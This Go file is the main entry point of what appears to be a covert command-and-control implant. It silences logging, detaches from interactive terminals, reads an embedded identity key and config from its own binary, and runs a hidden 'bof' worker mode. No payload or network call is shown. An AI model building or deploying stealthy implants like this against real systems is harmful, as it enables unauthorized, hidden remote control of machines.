package main

import (
	"context"
	"io"
	"log"
	"os"
	"os/signal"
	"syscall"

	"undertow/internal/agent"
	"undertow/internal/agentprofile"
	"undertow/internal/bof"
)

func main() {
	log.SetOutput(io.Discard)
	if len(os.Args) == 2 && os.Args[1] == "_bof-worker" {
		if err := bof.WorkerMain(os.Stdin, os.Stdout); err != nil {
			os.Exit(1)
		}
		return
	}
	if len(os.Args) != 1 {
		os.Exit(2)
	}
	path, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}
	if launched, err := detachIfInteractive(); err != nil {
		os.Exit(1)
	} else if launched {
		return
	}
	embedded, err := agentprofile.Read(path)
	if err != nil {
		os.Exit(1)
	}
	cfg := embedded.Config
	cfg.IdentityKey = embedded.IdentityKey
	cfg.Metadata = embedded.Identity()
	cfg.Packaged = true
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	if err := agent.Run(ctx, cfg, nil); err != nil {
		os.Exit(1)
	}
}
